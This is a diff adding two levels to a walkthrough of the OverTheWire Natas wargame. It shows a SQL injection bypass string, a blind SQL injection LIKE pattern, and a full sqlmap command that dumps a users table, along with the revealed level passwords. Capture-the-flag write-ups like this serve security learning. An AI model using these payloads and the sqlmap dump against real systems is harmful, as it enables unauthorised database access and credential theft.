@@ -320,3 +320,29 @@ hexeditor -b natas13.jpg
 ```
 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 ```
+## Level 13 - 14
+* http://natas14.natas.labs.overthewire.org
+* use sql injection
+```
+natas15" #
+```
+![](https://i.imgur.com/wcBQUpb.png)
+* password
+```
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
+## Level 14 - 15
+* http://natas15.natas.labs.overthewire.org
+* use bind sql injection by like query to combine the password
+```
+natas16" AND password LIKE BINARY "<CHAR>%" "
+```
+* use sqlmap tool
+```
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php" --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data="username=natas16" --string="This user exists" --level=5 --risk=3 -D natas15 -T users -C username,password --dump --threads=5
+```
+![](https://i.imgur.com/qYhAiA0.png)
+* password
+```
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
